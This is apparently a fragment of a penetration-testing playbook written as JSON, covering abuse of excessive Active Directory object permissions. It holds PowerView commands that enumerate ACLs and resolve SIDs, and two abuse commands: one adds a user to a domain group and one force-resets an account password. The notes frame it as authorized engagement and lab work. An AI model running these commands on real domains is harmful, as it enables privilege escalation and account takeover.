+   "does_not_prove": "administrative access in this host/context — not domain dominance unless separately proven",
+   "report": {
+    "finding": "Excessive AD Object Permissions (GenericAll/WriteDACL)",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon",
+    "https://www.thehacker.recipes/ad/movement/dacl"
+   ],
+   "commands": [
+    {
+     "tool": "powershell",
+     "run": "Get-ObjectAcl -Identity {{user}}",
+     "note": "ACEs applied to a specific object. The two fields that matter per ACE: ActiveDirectoryRights (what) and SecurityIdentifier (who holds it). ObjectSID is just the object you queried."
+    },
+    {
+     "tool": "powershell",
+     "run": "Get-ObjectAcl -Identity \"{{group}}\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights",
+     "note": "Who has full control over this group? Repeat with ForceChangePassword, WriteDACL, WriteOwner, AllExtendedRights. Sweep everything: Get-ObjectAcl | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} on each object of interest."
+    },
+    {
+     "tool": "powershell",
+     "run": "Convert-SidToName S-1-5-21-...-1104",
+     "note": "Turn SecurityIdentifier SIDs into readable names. Batch it: \"SID1\",\"SID2\" | Convert-SidToName. Domain Admins, Account Operators, SYSTEM are expected — a plain user is the anomaly."
+    },
+    {
+     "tool": "cmd",
+     "run": "net group \"{{group}}\" {{user}} /add /domain",
+     "note": "Abuse GenericAll on a group: add yourself. Verify with Get-NetGroup \"{{group}}\" | select member. CLEAN UP AFTER: net group \"{{group}}\" {{user}} /del /domain — and record both in your notes."
+    },
+    {
+     "tool": "powershell",
+     "run": "Set-DomainUserPassword -Identity {{user}} -AccountPassword (ConvertTo-SecureString \"NewPass123!\" -AsPlainText -Force) -Verbose",
+     "note": "Abuse ForceChangePassword/GenericAll on a USER: reset their password (PowerView). On engagements tell the client first; in labs, note the old state if known."
+    }
+   ]
+  }
+ ]
+}
